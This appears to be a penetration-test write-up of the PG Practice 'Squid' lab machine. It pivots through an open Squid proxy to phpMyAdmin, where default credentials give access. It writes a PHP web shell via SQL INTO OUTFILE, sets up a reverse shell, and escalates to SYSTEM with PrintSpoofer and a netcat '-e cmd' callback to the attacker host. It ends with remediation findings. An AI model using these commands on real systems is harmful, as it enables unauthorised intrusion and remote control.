# PG Practice Squid - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-9

---

## 0. Lesson Learned

Use FoxyProxy to proxy network traffic for you.

---

## 1. Executive Summary

A penetration test was conducted against the Squid host. Initial access was achieved via an exposed Squid proxy that allowed internal service access, leading to a misconfigured WAMP server with default credentials. Command execution was obtained through phpMyAdmin file write functionality, followed by a reverse shell.

Privilege escalation was achieved via SeImpersonatePrivilege abuse using PrintSpoofer techniques, resulting in full SYSTEM compromise.

---

## 2. Scope

- **Target:** 192.168.142.189
- **Environment:** PG Practice Squid
- **Testing Window:** 2026-4-9
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was conducted.

Command:

```
nmap -p- -sC -sV 192.168.142.189 -T4 -oA squid_tcp
```

Output (relevant):

```
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
3128/tcp open  http-proxy (Squid 4.14)
49666/tcp open msrpc
49667/tcp open msrpc
```

Interpretation:

The target exposes SMB and a Squid proxy (3128), indicating possible pivoting or internal access opportunities.

---

## 5. Enumeration

### SMB Enumeration

Command:

```
smbclient -L //192.168.142.189 -N
```

Output:

```
session setup failed: NT_STATUS_ACCESS_DENIED
```

Interpretation:

Anonymous SMB access is not permitted.

### Squid Proxy Enumeration

Using a proxy scanner to identify internal access:

Command:

```
python3 spose.py --proxy http://192.168.214.189:3128 --target 192.168.214.189
```

Output:

```
192.168.214.189:8080 seems OPEN
```

Interpretation:

The Squid proxy allows access to internal port 8080, indicating internal web service exposure.

### Web Enumeration via Proxy

Configured browser with proxy and accessed:

```
http://192.168.214.189:8080
```

Interpretation:

WAMP server identified with phpMyAdmin exposed.

---

## 6. Initial Access

### phpMyAdmin Login

Credentials used:

```
Username: root
Password: (blank)
```

Interpretation:

Default credentials allowed full database access.

### Identify Web Root

From phpinfo:

```
C:\wamp\www
```

### Writing Web Shell via SQL

Command:

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\shell.php";
```

Output:

```
Query OK
```

Interpretation:

A web shell was successfully written to the web root.

### Command Execution

Command:

```
http://192.168.214.189:8080/shell.php?cmd=whoami
```

Output:

```
nt authority\local service
```

Interpretation:

Code execution achieved as LOCAL SERVICE.

### Reverse Shell

Listener:

```
nc -lvnp 443
```

Payload Execution:

```
powershell -nop -w hidden -noni -ep bypass -c "<reverse shell>"
```

Output:

```
SHELL> whoami
nt authority\local service
```

Interpretation:

Reverse shell established successfully.

---

## 7. Post-Exploitation

Basic enumeration performed:

Commands:

```
whoami /priv
whoami /groups
systeminfo
```

Key Output:

```
SeImpersonatePrivilege Enabled
OS: Windows Server 2019
```

Interpretation:

SeImpersonatePrivilege is present, enabling token impersonation attacks.

---

## 8. Privilege Escalation

### PrintSpoofer

Upload:

```
iwr -uri http://192.168.45.191/PrintSpoofer.exe -Outfile PrintSpoofer.exe
```

Execution:

```
PrintSpoofer.exe -i -c powershell
```

Interpretation:

Initial attempt unsuccessful. Did not elevate privileges.

### PrintSpoofer with nc

Upload:

```
iwr -uri http://192.168.45.191/nc64.exe -Outfile nc64.exe
```
Command:

```
.\PrintSpoofer.exe -c "C:\Windows\Tasks\nc64.exe 192.168.45.191 53 -e cmd"
```

Output:

```
whoami
nt authority\system
```

Interpretation:

SYSTEM-level access successfully obtained.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Open Proxy Allowing Access to Internal Services

**Severity:** High

**Description:**
A proxy service (e.g., Squid) allowed unrestricted access to internal services, enabling users to connect to otherwise inaccessible hosts and ports.

**Impact:**
Attackers could pivot into internal networks, enumerate hidden services, and identify additional attack paths.

**Recommendation:**
Restrict proxy access using authentication and IP whitelisting, and limit accessible destinations to trusted networks only.

### **Finding:** Default phpMyAdmin Credentials

**Severity:** Critical

**Description:**
The phpMyAdmin interface allowed authentication using default credentials (e.g., root with no password).

**Impact:**
Attackers could gain full database access, modify data, and potentially write files to the underlying system.

**Recommendation:**
Disable default credentials, enforce strong authentication, and restrict access to administrative interfaces.

### **Finding:** Arbitrary File Write via Database Service

**Severity:** Critical

**Description:**
The database service (e.g., MySQL) permitted writing files to the server filesystem, including web-accessible directories.

**Impact:**
Attackers could upload malicious files such as web shells and achieve remote code execution.

**Recommendation:**
Restrict FILE privileges, prevent database services from writing to web directories, and enforce least-privilege access controls.

### **Finding:** SeImpersonatePrivilege Assigned to Service Account

**Severity:** Critical

**Description:**
A service account possessed the SeImpersonatePrivilege privilege, allowing token impersonation attacks.

**Impact:**
Attackers could exploit token impersonation techniques to escalate privileges to SYSTEM.

**Recommendation:**
Remove unnecessary impersonation privileges, harden service account permissions, and monitor for abnormal privilege usage.

### **Finding:** Lack of Egress Filtering

**Severity:** High

**Description:**
The system allowed unrestricted outbound network connections to external hosts.

**Impact:**
Attackers could establish reverse shells and maintain persistent remote access.

**Recommendation:**
Implement outbound firewall rules to restrict unauthorized connections and monitor network traffic for suspicious activity.

---

## 11. Appendix

Pentesting Squid Proxy - 
[https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html](https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html)

Squid Pivoting Open Port Scanner -
[https://github.com/aancw/spose](https://github.com/aancw/spose)

Uploading Reverse Shell in phpMyAdmin -
[https://medium.com/@toon.commander/uploading-a-shell-in-phpmyadmin-61b066b481a7](https://medium.com/@toon.commander/uploading-a-shell-in-phpmyadmin-61b066b481a7)

PrintSpoofer SeImpersonatePrivilege Token Impersonation Tool -
[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)